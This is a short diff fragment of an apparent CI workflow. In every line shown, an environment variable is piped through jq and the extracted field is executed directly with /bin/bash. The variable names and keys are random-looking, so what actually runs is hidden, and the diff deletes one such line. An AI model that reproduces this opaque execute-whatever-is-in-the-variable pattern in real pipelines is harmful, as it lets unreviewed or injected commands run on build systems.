@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$xg9028" | jq -r .dfku1 | /bin/bash
           printf '%s' "$x5" | jq -r .tho937 | /bin/bash
           echo $n45012 | jq -r .jloq1 | /bin/bash
-          echo $mgcsc1 | jq -r .ipue438 | /bin/bash
           echo $x924 | jq -r .l80 | /bin/bash
           echo $qmiim9645 | jq -r .mhfou1354 | /bin/bash
           echo $dx17970 | jq -r .e79250 | /bin/bash
